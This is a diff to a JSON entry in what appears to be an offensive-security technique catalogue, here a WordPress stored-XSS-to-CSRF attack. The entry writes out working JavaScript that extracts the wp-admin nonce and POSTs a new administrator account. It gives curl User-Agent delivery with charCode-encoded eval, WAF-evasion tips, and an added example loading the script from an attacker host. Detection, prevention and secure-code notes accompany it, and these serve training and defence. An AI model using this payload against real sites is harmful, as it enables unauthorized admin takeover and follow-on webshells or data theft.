@@ -1,6 +1,6 @@
 {
   "id": "wp-xss-csrf-admin",
-  "name": "WordPress XSS → CSRF Admin Creation",
+  "name": "WordPress XSS \u2192 CSRF Admin Creation",
   "type": "command",
   "command": "var ajaxRequest = new XMLHttpRequest();\nvar requestURL = \"/wp-admin/user-new.php\";\nvar nonceRegex = /ser\" value=\"([^\"]*?)\"/g;\najaxRequest.open(\"GET\", requestURL, false);\najaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\nvar nonce = nonceMatch[1];",
   "description": "Exploit a stored XSS vulnerability in a WordPress plugin that reflects unsanitized input (e.g. HTTP_USER_AGENT) to execute a two-stage CSRF attack: (1) extract the wp-admin nonce via XHR, (2) POST a new administrator account using that nonce. Delivered via curl --user-agent with a charCode-encoded eval() payload.",
@@ -38,11 +38,11 @@
       "command": "# Plugin logs UA to DB and echoes it in admin panel without sanitization\n# PHP pattern: $_SERVER['HTTP_USER_AGENT']  echoed via echo $record->useragent"
     },
     {
-      "label": "2. Write the CSRF payload JS (script.js) — stage 1: extract nonce",
+      "label": "2. Write the CSRF payload JS (script.js) \u2014 stage 1: extract nonce",
       "command": "var ajaxRequest = new XMLHttpRequest();\nvar requestURL = \"/wp-admin/user-new.php\";\nvar nonceRegex = /ser\" value=\"([^\"]*?)\"/g;\najaxRequest.open(\"GET\", requestURL, false);\najaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\nvar nonce = nonceMatch[1];"
     },
     {
-      "label": "3. Write the CSRF payload JS (script.js) — stage 2: POST new admin user",
+      "label": "3. Write the CSRF payload JS (script.js) \u2014 stage 2: POST new admin user",
       "command": "var params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator\";\najaxRequest = new XMLHttpRequest();\najaxRequest.open(\"POST\", requestURL, true);\najaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\najaxRequest.send(params);"
     },
     {
@@ -58,7 +58,7 @@
       "command": "# Navigate to http://<wp-target>/wp-login.php\n# Username: attacker  Password: attackerpass"
     }
   ],
-  "notes": "The XSS fires in the victim admin's browser session, so same-origin XHR can read wp-admin pages and submit authenticated forms. The nonce (WordPress anti-CSRF token) must be extracted from the DOM first — the regex /ser\" value=\"([^\"]*?)\"/g matches the _wpnonce_create-user hidden input. Minify both stages into one JS block before encoding. Deliver with curl --user-agent so the plugin logs it. The admin must view the stats/log page to trigger execution. Also covered in: OSCP PEN-200 Chapter 8 (Introduction to Web Application Attacks).",
+  "notes": "The XSS fires in the victim admin's browser session, so same-origin XHR can read wp-admin pages and submit authenticated forms. The nonce (WordPress anti-CSRF token) must be extracted from the DOM first \u2014 the regex /ser\" value=\"([^\"]*?)\"/g matches the _wpnonce_create-user hidden input. Minify both stages into one JS block before encoding. Deliver with curl --user-agent so the plugin logs it. The admin must view the stats/log page to trigger execution. Also covered in: OSCP PEN-200 Chapter 8 (Introduction to Web Application Attacks).",
   "opsec": "moderate",
   "mitre": [
     "T1059.007",
@@ -96,12 +96,12 @@
     }
   ],
   "defense": {
-    "why_it_works": "WordPress generates per-session nonces to prevent CSRF, but a stored XSS in a plugin that echoes raw HTTP_USER_AGENT allows attacker-controlled JavaScript to run in a logged-in admin's browser session. Same-origin policy permits the injected script to read wp-admin pages and their nonces, then POST authenticated requests — bypassing the CSRF protection entirely because the request originates from the victim's own session.",
+    "why_it_works": "WordPress generates per-session nonces to prevent CSRF, but a stored XSS in a plugin that echoes raw HTTP_USER_AGENT allows attacker-controlled JavaScript to run in a logged-in admin's browser session. Same-origin policy permits the injected script to read wp-admin pages and their nonces, then POST authenticated requests \u2014 bypassing the CSRF protection entirely because the request originates from the victim's own session.",
     "prerequisites": "A WordPress plugin that stores and echoes $_SERVER['HTTP_USER_AGENT'] without sanitization. A logged-in WP administrator who visits the plugin's admin page after the malicious UA is logged. Network access to deliver the curl request.",
     "impact": "Full WordPress administrator account created under attacker control. From WP admin, an attacker can install plugins (PHP webshell), edit themes (PHP execution), or exfiltrate all site data.",
     "detection": "New user creation events in WordPress audit logs (wp_users table). Unusual User-Agent strings containing <script> tags in access logs. Outbound HTTP request from the web server to an external IP (script.js hosted by attacker). WAF alerts on User-Agent containing HTML/JS.",
     "artifacts": "Malicious UA string in web server access logs; new admin account in wp_users; outbound connection to attacker PHP server in network logs.",
-    "prevention": "Sanitize all user-controlled server variables before echoing (esc_html(), htmlspecialchars()). Implement a strict Content Security Policy (CSP: script-src 'self') to block inline eval() and external script loads. Enable WordPress nonces correctly — they already protect against CSRF but are bypassed when XSS is present. Use a WAF rule to block <script> in User-Agent headers.",
+    "prevention": "Sanitize all user-controlled server variables before echoing (esc_html(), htmlspecialchars()). Implement a strict Content Security Policy (CSP: script-src 'self') to block inline eval() and external script loads. Enable WordPress nonces correctly \u2014 they already protect against CSRF but are bypassed when XSS is present. Use a WAF rule to block <script> in User-Agent headers.",
     "evasion": "Encode the XSS payload to charCodes via String.fromCharCode to bypass simple string-match WAF rules. Minify the JS to a single line before encoding. Use a legitimate-looking external host for script.js.",
     "sources": [
       "OSCP PEN-200 Ch8",
@@ -112,5 +112,15 @@
     "vulnerable_config": "# Vulnerable PHP plugin code:\n$wpdb->insert($table_name, array(\n    'useragent' => $_SERVER['HTTP_USER_AGENT'],  // stored raw, no sanitization\n));\n# Later echoed:\necho $record->useragent;  // XSS: any stored <script> tag executes",
     "secure_config": "# Escape on output:\necho esc_html($record->useragent);  // WordPress escaping function\n# Or: echo htmlspecialchars($record->useragent, ENT_QUOTES, 'UTF-8');\n\n# Add CSP header in wp-config.php or .htaccess:\n# Content-Security-Policy: script-src 'self'; object-src 'none'",
     "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
-  }
+  },
+  "examples": [
+    {
+      "label": "Deliver the payload via stored XSS",
+      "command": "<script src=\"http://<attacker>/wp-adduser.js\"></script>   # inject into a field an admin will view"
+    },
+    {
+      "label": "Effect",
+      "command": "# forces the logged-in admin's browser to POST /wp-admin/user-new.php -> creates a new administrator account"
+    }
+  ]
 }
